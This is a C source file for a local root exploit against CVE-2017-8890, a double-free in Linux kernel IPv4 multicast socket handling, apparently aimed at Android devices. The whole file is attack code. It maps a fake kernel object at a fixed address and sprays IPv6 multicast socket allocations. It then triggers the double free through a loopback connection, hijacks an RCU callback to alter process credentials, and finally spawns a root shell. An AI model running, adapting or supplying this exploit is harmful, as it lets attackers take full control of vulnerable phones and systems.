/*
 * CVE-2017-8890
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <errno.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/time.h>
#include <sys/prctl.h>
#include <sched.h>

// #define DEBUG 1
#define PRINT 1

#ifdef DEBUG
    #define LOGV(...) { printf("%s @ %s:%d with log: ", __FILE__, __FUNCTION__, __LINE__); printf(__VA_ARGS__); fflush(stdout); }
#elif PRINT
    #define LOGV(...) { printf(__VA_ARGS__); fflush(stdout); }
#else
    #define LOGV(...)
#endif

#ifndef ONE_IGMP_H 
#define ONE_IGMP_H

#define __rcu

struct callback_head {
  struct callback_head *next;
  void (*func)(struct callback_head *head);
};
#define rcu_head callback_head

struct ip_sf_socklist {
  unsigned int  sl_max;
  unsigned int  sl_count;
  struct rcu_head   rcu;
  __be32    sl_addr[0];
};

struct ip_mc_socklist {
  struct ip_mc_socklist __rcu *next_rcu;
  struct ip_mreqn   multi;
  unsigned int  sfmode;   /* MCAST_{INCLUDE,EXCLUDE} */
  struct ip_sf_socklist __rcu *sflist;
  struct rcu_head   rcu;
};
#endif // ONE_IGMP_H

#define fake_iml_next_rcu (0x0c000000) //struct ip_mc_socklist __rcu *next_rcu;


#define fake_iml_offset 0xff    // for bypass ipv6_addr_is_multicast(addr)
#define rcu_head_offset sizeof(struct ip_mc_socklist) - sizeof(struct rcu_head)

extern void obtain_root_privilege_by_modify_task_cred();

#define adp_fake_iml_func obtain_root_privilege_by_modify_task_cred

#define FIX_MMAP_BUGS 1

int PORT = 10086;

struct group_req gr_spray = { 0 };
struct sockaddr_in6 in6_spray = { 0 };
int pad_times = 60;
int ipv6_fd_pad[60] = { 0 };
int spray_times = 500;
int ipv6_fd_spray[500] = { 0 };

// #define FORKCHILD 1
int children_num = 7;
int child_pids[8] = { 0 };

/* cpu imformation */
int bind_cpu_id = 0;
#define cur_cpu_num sysconf(_SC_NPROCESSORS_CONF)

static int bind_process_on_cpu(int cpuid) {
  LOGV("[!] process(%d) prepare bind on cpu[%d].\n", getpid(), cpuid);

  int bind_cpu = -1;
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(cpuid, &mask);

  while(0 == CPU_ISSET(cpuid, &mask)) {
    perror("CPU_SET");
    CPU_SET(cpuid, &mask);
  }

  if (cpuid == 7)
    return sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);

  while(bind_cpu != cpuid) {
    sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);
    bind_cpu = sched_getcpu();
  }
  LOGV("[+] process(%d) now bind on cpu[%d].\n", getpid(), bind_cpu);

  return bind_cpu;
}

static int bind_thread_on_cpu(int cpuid) {
  int bind_cpu = -1, ret = -1, tid = -1;
  tid = gettid();

  LOGV("[!] thread(%d) prepare bind on cpu[%d].\n", tid, cpuid);

  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(cpuid, &mask);

  while(0 == CPU_ISSET(cpuid, &mask)) {
    perror("CPU_SET");
    CPU_SET(cpuid, &mask);
  }

  if (cpuid == 7)
    return syscall(__NR_sched_setaffinity, tid, sizeof(mask), &mask);  

  while(bind_cpu != cpuid || ret != 0) {
    ret = syscall(__NR_sched_setaffinity, tid, sizeof(mask), &mask);  
    bind_cpu = sched_getcpu();
    // printf("ret = %d, bind_cpu = %d\n", ret, bind_cpu);
    // perror("__NR_sched_setaffinity");
  }

  LOGV("[+] thread(%d) now bind on cpu[%d].\n", tid, bind_cpu);

  return bind_cpu;
}

static void set_bind_cpu_id() {
  bind_cpu_id = sched_getcpu();
  LOGV("[!] all will bind on cpu[%d]\n", bind_cpu_id);
}

static void init_fake_iml_obj(void) {
  if (mmap((void*)fake_iml_next_rcu, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
    LOGV("[-] mmap at %p failed.\n", (void*) fake_iml_next_rcu);

  struct ip_mc_socklist *iml = (void*)(fake_iml_next_rcu + fake_iml_offset);

  iml->next_rcu = (void*) NULL;
  iml->rcu.next = (void*) NULL;
  iml->rcu.func = (void*) NULL;

  LOGV("[*] iml : %p, &(iml->rcu.next) : %p\n", (void*)iml, &(iml->rcu.next));

}

static void *th_placeholder(void * arg) {
  bind_thread_on_cpu(bind_cpu_id);
  struct rcu_head* head = (void*)(fake_iml_next_rcu + fake_iml_offset + rcu_head_offset);
  LOGV("[!] original value head: %p, head->next : %p, head->func : %p\n", head, head->next, head->func);

  while (1) {
    if ( head->next ) {
      head->func = (void*) adp_fake_iml_func;
      break;
    }
  }

  LOGV("[!] fake_iml_next_rcu was modified to : head->next : %p, head->func : %p\n", head->next, head->func);
  while(1) {}
  return NULL;
}

static int prepare_spray_obj(int fd,
  struct group_req* gr_spray_ptr, 
  struct sockaddr_in6* in6_spray_ptr, unsigned c) {

  gr_spray_ptr->gr_interface = 1;
  in6_spray_ptr->sin6_family = AF_INET6;
  // int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00";
  int8_t addr[16] = { 0 };
  *((int*) &addr) = fake_iml_next_rcu + fake_iml_offset;
  *(unsigned*)&addr[8] = c;
  memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof addr);
  memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
  return setsockopt(fd, SOL_IPV6, MCAST_JOIN_GROUP, gr_spray_ptr, sizeof(*gr_spray_ptr));
}

static int prepare() {
  int i, ret;

  int times = pad_times / 2;

  LOGV("[*] Create spray socket fd spray %d times.\n", spray_times);
  int c;
  for ( i = 0 ; i < spray_times ; i++ ) {
    if ((ipv6_fd_spray[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
      LOGV("[-] socket() failed.\n");
    }
  }

  LOGV("[*] Create spray socket fd pad %d times.\n", pad_times);

  for (i = 0; i < pad_times ; i++ ) {
    if ((ipv6_fd_pad[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
      LOGV("[-] socket() failed.\n");
    }
  }

#if 1
  pthread_t th_check;
  if(pthread_create(&th_check, NULL, th_placeholder, NULL))
    LOGV("[-] placeholder thread error.\n");
#endif

  int cnt = 0;

  for (i = 0; i < times; i++, cnt = 0) {
    ret = 0;
    while(ret == 0) {
      ret = prepare_spray_obj(ipv6_fd_pad[i], &gr_spray, &in6_spray, cnt++);
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  LOGV("[+] spray ipv6 obj(%d times) done, not yet close.\n", times);

  LOGV("[cpu] process(%d) now bind on cpu[%d].\n", getpid(), sched_getcpu());

  return 0;
}


int server_init = 0;
int server_finish = 0;
int client_finish = 0;
int conntfd[2] = { 0 };
int connect_times = 2;

static void *th_client_connect(void *arg) {
  bind_thread_on_cpu(bind_cpu_id);
  int sockfd, i;

  struct sockaddr_in si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("127.0.0.1"),
  };

  while(!server_init)
    usleep(1);

  for ( i = 0 ; i < connect_times ; i++ ) {
    sockfd = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP);

    if (connect(sockfd, (struct sockaddr*)&si, sizeof(si)) != 0 ) {
      LOGV("[-] client-%d connected failed.\n", i);
    }
    close(sockfd);
  }
  client_finish = 1;
  while(1){}
  pthread_exit(0);
}

static void spray_to_free_hole() {
  int times = 100;
  int sockfd[times];
  int i, ret;

  for (i = 0; i < times; ++i) {
    if ((sockfd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
      LOGV("[-] socket() failed.\n");
    }
  }

  int cnt = 0;

  for (i = 0; i < times; i++, cnt = 0) {
    ret = 0;
    while(ret == 0) {
      ret = prepare_spray_obj(sockfd[i], &gr_spray, &in6_spray, cnt++);
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  for (i = 0; i < times; ++i)
    close(sockfd[i]);

  struct rcu_head* head = (void*)(fake_iml_next_rcu + fake_iml_offset + rcu_head_offset);
  LOGV("[*] close(conntfd[1] before: head->next : %p, head->func = %p\n", head->next, head->func);

  LOGV("[!] secound free mc_list obj.\n");
  if ( connect_times != 1 )
    close(conntfd[1]);

  LOGV("[*] close(conntfd[1] after: head->next : %p, head->func = %p\n", head->next, head->func);

  while(1) {
    if ( head->next ) {
      head->func = (void*) adp_fake_iml_func;
      break;
    }
  }
  LOGV("[+] head->next : %p, head->func = %p\n", head->next, head->func);

  LOGV("[cpu] process(%d) now bind on cpu[%d].\n", getpid(), sched_getcpu());

}

static int trigger() {
  int i, ret;
  int times = 30;

  int server_sockfd;

  server_sockfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);

  struct sockaddr_in gr_si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("224.0.0.0"), // multicast address
  };

  struct group_req group;
  group.gr_interface = 1;
  memcpy(&group.gr_group, &gr_si, sizeof(gr_si));

  if (setsockopt(server_sockfd, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof(group)) == -1)
    LOGV("[-] setsockopt failed.\n");

  struct sockaddr_in serv_addr = {};
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  bind(server_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

  listen(server_sockfd, 2);
  
  pthread_t th_client;
  // Create a client thread to connect.
  if ( pthread_create(&th_client, NULL, th_client_connect, NULL))
    LOGV("[-] th_client_connect failed.\n");

  server_init = 1;

  for ( i = 0 ; i < connect_times ; i++ ) {
    conntfd[i] = accept4(server_sockfd, NULL, NULL, 0);
    if(conntfd[i] >= 0 ) {
      LOGV("[+] accept() succeed.\n");
    } else {
      LOGV("[-] accept() failed.\n");
    }
  }

  while(!client_finish)
    usleep(1);

  server_finish = 1;

  int cnt = 0;
  for (i = times; i < pad_times; i++, cnt = 0) {
    ret = 0;
    while(ret == 0) {
      ret = prepare_spray_obj(ipv6_fd_pad[i], &gr_spray, &in6_spray, cnt++);
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  // first free...
  LOGV("[!] first free mc_list obj.\n");
  if (conntfd[0] ) 
    close(conntfd[0]);

  // release hole.
  for (i = 0 ; i < pad_times; i++ )
    close(ipv6_fd_pad[i]);

  LOGV("[*] %d times to spray for the hole.\n", spray_times);

  for (i = 0; i < spray_times; i++, cnt = 0) {
    ret = 0;
    while(ret == 0) {
      ret = prepare_spray_obj(ipv6_fd_spray[i], &gr_spray, &in6_spray, cnt++);
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  LOGV("[cpu] process(%d) now bind on cpu[%d].\n", getpid(), sched_getcpu());

#if FORKCHILD
  LOGV("[*] kill chilren by fork()?\n");
  for ( i = 0 ; i < children_num ; i++ ) {
    LOGV("kill pid : %d\n", child_pids[i]);
    kill(child_pids[i], SIGKILL);
  }
  wait(NULL);
  
  LOGV("[+] All killed\n");
#endif 

  // begin padding the free hole!
  spray_to_free_hole();

  return 0;
}

static ssize_t read_at_address_pipe(const void *src, void *dest, size_t count) {
  int pipefd[2] = { 0 };
  ssize_t len = 0;
  if (pipe(pipefd) < 0) {
    printf("pipe failed\n");
    return -1;
  }
  errno = 0;
  len = write(pipefd[1], src, count);
  if (len != count) {
    printf("[-] FAILED READ @ %p : %d, errno = %d, msg = %s\n", src, (int)len, errno, strerror(errno));
    close(pipefd[0]);
    close(pipefd[1]);
    return -1;
  }
  read(pipefd[0], dest, count);
  close(pipefd[0]);
  close(pipefd[1]);
  return len;
}

static void *th_fix_mmap_area(void *arg) {
  bind_thread_on_cpu(bind_cpu_id);
  int value;
  unsigned long check_mem = (unsigned long) fake_iml_next_rcu + fake_iml_offset + rcu_head_offset;
  while(1) {
    if (read_at_address_pipe((void*)check_mem, (void*)&value, sizeof(value)) != sizeof(value)) {
      LOGV("[!] 0x%lx mmap area need fix to remap\n", check_mem);

      if (mmap((void*)fake_iml_next_rcu, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0)
        LOGV("[-] 0x%lx re mmap false, errno = %d, msg = %s\n", check_mem, errno, strerror(errno));

      usleep(300 * 1000);
    }
  }
}

int main(int argc, char *argv[]) {
  set_bind_cpu_id();

  printf("\t[*] start, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

#if FORKCHILD
  int i;
  for ( i = 0; i < children_num ; i++ ) {
    if ( (child_pids[i] = fork() ) == 0 ) {
      LOGV("I'm child : %d\n", i);
      while(time((time_t*)NULL));
    }
  }
#endif

  bind_process_on_cpu(bind_cpu_id);

  fprintf(stderr, "\t[1] padding data to fake obj.\n");
  init_fake_iml_obj();

  fprintf(stderr, "\t[2] prepare heap spray data.\n");
  if (prepare() < 0 )
    LOGV("[-] prepare failed.\n");

#ifdef FIX_MMAP_BUGS
  fprintf(stderr, "[?] fix mmap bugs???\n");
  pthread_t th_fix_mmap;
  if(pthread_create(&th_fix_mmap, NULL, th_fix_mmap_area, NULL))
    LOGV("[-] fix_mmap_th failed.\n");
#endif
 
  fprintf(stderr, "\t[3] trigger exploit.\n");
  if (trigger() < 0 )
    LOGV("[-] trigger failed.\n");

  while(getuid()!= 0) {
    sleep(1);
  }

  printf("\t[4] get root.\n");

  printf("\t[*] end, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  system("/system/bin/id");

#if 1
  char *argvs[] = {"sh", NULL};
  execve("/system/bin/sh", argvs, NULL);
#else
  system("/system/bin/sh");
#endif

  printf("hang up...\n");
  while(1);
  return 0;
}
